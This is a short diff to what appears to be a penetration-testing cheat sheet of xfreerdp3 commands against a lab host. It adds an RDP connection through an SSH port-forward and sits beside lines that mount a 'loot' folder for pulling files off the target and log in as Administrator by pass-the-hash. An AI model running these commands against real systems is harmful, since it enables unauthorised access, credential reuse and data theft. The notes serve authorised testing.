@@ -281,6 +281,10 @@ xfreerdp3 /d:$DOMAIN /u:$USER /p:$PASSWORD /v:172.19.0.2 \
 xfreerdp3 /u:$USER /p:$PASSWORD /v:172.19.0.2 /cert:ignore \
   /drive:loot,/tmp/loot        # shows up as \\tsclient\loot on the target
 
+# Through a local port-forward (e.g. ssh -L 3389:172.19.0.2:3389), with a mounted drive
+xfreerdp3 /v:127.0.0.1 /u:$USER /p:$PASSWORD /sec:tls /cert:ignore \
+  /dynamic-resolution /drive:share,$LOCAL_DIR
+
 # Pass-the-hash (target must allow Restricted Admin mode)
 xfreerdp3 /u:Administrator /pth:$NTHASH /v:172.19.0.2 /cert:ignore
 # Enable Restricted Admin first if needed (requires SMB admin):
